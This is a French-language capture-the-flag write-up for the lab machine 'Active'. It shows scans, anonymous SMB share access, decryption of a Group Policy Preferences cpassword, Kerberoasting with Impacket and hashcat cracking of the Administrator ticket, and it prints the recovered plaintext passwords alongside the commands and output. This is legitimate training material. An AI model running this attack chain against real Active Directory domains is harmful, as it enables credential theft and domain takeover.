# 10.10.10.100

# Reco

`sudo nmap -sC -sV -T4 -vvv -p- 10.10.10.100`

```
PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2018-10-05 13:33:20Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
194/tcp   filtered irc           no-response
389/tcp   open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     tcpwrapped    syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped    syn-ack ttl 127
3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped    syn-ack ttl 127
4196/tcp  filtered unknown       no-response
5722/tcp  open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
28993/tcp filtered unknown       no-response
29132/tcp filtered unknown       no-response
39876/tcp filtered unknown       no-response
42213/tcp filtered unknown       no-response
44712/tcp filtered unknown       no-response
46717/tcp filtered unknown       no-response
47001/tcp open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47897/tcp filtered unknown       no-response
49152/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49169/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49174/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49182/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
57558/tcp filtered unknown       no-response
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

`sudo nmap -sU -sC -sV -vvv --top-ports 100 10.10.10.100`

```
PORT      STATE         SERVICE        REASON               VERSION
53/udp    open          domain         udp-response ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/udp    open          kerberos-sec   udp-response         Microsoft Windows Kerberos (server time: 2018-10-05 13:12:29Z)
123/udp   open          ntp            udp-response ttl 127 NTP v3
| ntp-info: 
|_  receive time stamp: 2018-10-05T13:17:26
```

# Ports
## SMB (445/TCP)

- On utilise `smbclient` pour voir s'il y a des SHARES accessible en anonyme : `$ smbclient -L 10.10.10.100`

```
Enter WORKGROUP\user's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
```

- On peut aussi utiliser CME : `$ sudo crackmapexec smb 10.10.10.100 -u '' -p '' -d WORKGROUP --shares`

```
CME          10.10.10.100:445 DC              [*] Windows 6.1 Build 7601 (name:DC) (domain:ACTIVE)
CME          10.10.10.100:445 DC              [-] WORKGROUP\: STATUS_ACCESS_DENIED 
CME          10.10.10.100:445 DC              [+] Enumerating shares
CME          10.10.10.100:445 DC              SHARE           Permissions
CME          10.10.10.100:445 DC              -----           -----------
CME          10.10.10.100:445 DC              ADMIN$          NO ACCESS
CME          10.10.10.100:445 DC              IPC$            NO ACCESS
CME          10.10.10.100:445 DC              SYSVOL          NO ACCESS
CME          10.10.10.100:445 DC              C$              NO ACCESS
CME          10.10.10.100:445 DC              Replication     READ
CME          10.10.10.100:445 DC              NETLOGON        NO ACCESS
CME          10.10.10.100:445 DC              Users           NO ACCESS
[*] KTHXBYE!
```

- On se connecte sur le share `Replication` qui est accessible en lecture : 

`$ smbclient -N \\\\10.10.10.100\\Replication`
```
Anonymous login successful
Try "help" to get a list of possible commands.         
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018
```

### GPP

- Le dossier `active.htb` contiens un dossier `Policies` contenant lui même les dossiers `{6AC1786C-016F-11D2-945F-00C04fB984F9}` et `{31B2F340-016D-11D2-945F-00C04FB984F9}`. Le second contiens divers sous-dossiers ainsi qu'un fichier `Groups.xml` contenant entre autre : 

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
``` 

- Le mot de passe est chiffré en AES, en  utilisant une clé qui a été rendus publique par microsoft en 2012

`gp3finder.exe -D edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
pG5aSVYdYw/NglVmQ`
```
Group Policy Preference Password Finder (GP3Finder) $Revision: 4.0 $
Copyright (C) 2015  Oliver Morton (Sec-1 Ltd)
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions. See GPLv2 License.

GPPstillStandingStrong2k18
```

`sudo crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p "GPPstillStandingStrong2k18" -d active.htb`

```
CME          10.10.10.100:445 DC              [*] Windows 6.1 Build 7601 (name:DC) (domain:ACTIVE)
CME          10.10.10.100:445 DC              [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
[*] KTHXBYE!
```

# Elevation de priviléges - Kerberoasting 

`$ python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS`

```
Impacket v0.9.18-dev - Copyright 2018 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-07-30 19:17:40 

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$c51bf8fa824a93d36310a0a4d102830e$b31f57f1b2f6e19ec9d7c9fbbd46834c6a2b27e5f191ea995c64048d4a7a055b24015b80f6c92d4639bc61a3a49e07a0ca9b98d5c0b591fe32e34925782e47a2a6daa7dc633a3a9322b8bc602eed098e3bee8c43861591a18f625136f4240c74298be9d0914b774fc24d1330fa99c133b038ce21fae025977ff7d5e787ce621a76ae618f8971db63b305568045f131d5a9174817811cabe8db97563e63b6c43df991e757a6a8560a3d8ab3e709e14b3868d579a19d273eceafa7f0ec8247819137d8ab98709abbbc9f3bc4546446eb12ff2f6a985298ef38032f3add0797be90873503db539cf4a3870777063401eff47ab8a6b9b1f713cc8931b393f1183841ca5ab5950b79c02e4c64e611596d21f27bb03358a2cd24bfb9c2ea5adfaa793e69e9fb74ac77dd3097e979a1a41bb624c2cad511171c8d9b1da711d2ad642b71a4fb4f65f68283065c4f857aabb387f6edb5a14784742e0aeb5bbca50050e01fab1489b14b0ca2b430c9324b58c1c14f95de0145e06ba2f1f2f1853870ab6e98c108c1e8b3304c1cf155ab438d0fe64a3c3b3f96c913c64264b930e07491417a66c736589595227d06cd3f4565f2bfb9ed6d35a9504a0e20b1c1c47dccf2e1be2547138981f514dd487772d9a0b194b07d675910990c1db3894f9604e6d4a85a8dac4d3a7670b90f2f5ea15960bf975770f386d1d5262854d3ebd3eaabf0bc4c8ec89e9e365eda50d1c115e4e529538b516f0332c19286f8367cc0a40e37301d2b972b1b4a651b34e409dece7b8b07eb1bec58e47f22bce4ea12665b939ea63111f707f83149fabe59af18fcd80631dd6713012ed79d63951900b8c5c1a204c034e1ee1969d12ec1505485f1488eda954691d0311e3e8f5b70f184f69cacb7e476750aa6246736ec5b3f39e9c26f355bca91b263de2ee3f1b1f34e289110bc8023efcb53dd6a3e5206fda68bda598870096360e9f13889de51fd3f8754d2d2a207ac882900a1f46078594340faa9412b1eeabe2f805b8350eb9ef896ea5478684341399a3111a9cf2f7acede6e5e100b0d719c7e8d8304f6619cfd88bddef1c04de647bfb3fa12079344adb098b4ee4f6369b6e993c356f9f18488a202bf9e26d6f0bfcfd4975abcc4eff39d0884ca9347b06e945d8b4436657902413ceae9c9f6487e19ea43fb8f40f23488f10b816b17adf84c3225d7e2e8b4c831ba8f666f7ba5fe97d8fc24d4fd7edc1f32296318010523217872271de712
```

`$ sudo hashcat -m 13100 -a 0 spn.txt /usr/share/wordlists/rockyou-full.txt --force`

```
hashcat (v4.2.1) starting...

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$c51bf8fa824a93d36310a0a4d102830e$b31f57f1b2f6e19ec9d7c9fbbd46834c6a2b27e5f191ea995c64048d4a7a055b24015b80f6c92d4639bc61a3a49e07a0ca9b98d5c0b591fe32e34925782e47a2a6daa7dc633a3a9322b8bc602eed098e3bee8c43861591a18f625136f4240c74298be9d0914b774fc24d1330fa99c133b038ce21fae025977ff7d5e787ce621a76ae618f8971db63b305568045f131d5a9174817811cabe8db97563e63b6c43df991e757a6a8560a3d8ab3e709e14b3868d579a19d273eceafa7f0ec8247819137d8ab98709abbbc9f3bc4546446eb12ff2f6a985298ef38032f3add0797be90873503db539cf4a3870777063401eff47ab8a6b9b1f713cc8931b393f1183841ca5ab5950b79c02e4c64e611596d21f27bb03358a2cd24bfb9c2ea5adfaa793e69e9fb74ac77dd3097e979a1a41bb624c2cad511171c8d9b1da711d2ad642b71a4fb4f65f68283065c4f857aabb387f6edb5a14784742e0aeb5bbca50050e01fab1489b14b0ca2b430c9324b58c1c14f95de0145e06ba2f1f2f1853870ab6e98c108c1e8b3304c1cf155ab438d0fe64a3c3b3f96c913c64264b930e07491417a66c736589595227d06cd3f4565f2bfb9ed6d35a9504a0e20b1c1c47dccf2e1be2547138981f514dd487772d9a0b194b07d675910990c1db3894f9604e6d4a85a8dac4d3a7670b90f2f5ea15960bf975770f386d1d5262854d3ebd3eaabf0bc4c8ec89e9e365eda50d1c115e4e529538b516f0332c19286f8367cc0a40e37301d2b972b1b4a651b34e409dece7b8b07eb1bec58e47f22bce4ea12665b939ea63111f707f83149fabe59af18fcd80631dd6713012ed79d63951900b8c5c1a204c034e1ee1969d12ec1505485f1488eda954691d0311e3e8f5b70f184f69cacb7e476750aa6246736ec5b3f39e9c26f355bca91b263de2ee3f1b1f34e289110bc8023efcb53dd6a3e5206fda68bda598870096360e9f13889de51fd3f8754d2d2a207ac882900a1f46078594340faa9412b1eeabe2f805b8350eb9ef896ea5478684341399a3111a9cf2f7acede6e5e100b0d719c7e8d8304f6619cfd88bddef1c04de647bfb3fa12079344adb098b4ee4f6369b6e993c356f9f18488a202bf9e26d6f0bfcfd4975abcc4eff39d0884ca9347b06e945d8b4436657902413ceae9c9f6487e19ea43fb8f40f23488f10b816b17adf84c3225d7e2e8b4c831ba8f666f7ba5fe97d8fc24d4fd7edc1f32296318010523217872271de712:Ticketmaster1968
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...1de712
Time.Started.....: Thu Oct 11 17:57:05 2018 (39 secs)

Started: Thu Oct 11 17:56:50 2018
Stopped: Thu Oct 11 17:57:45 2018
```

# Proof

- Root : `b5fcXXXXXXXXXX77b2fbf2d54d0f708b`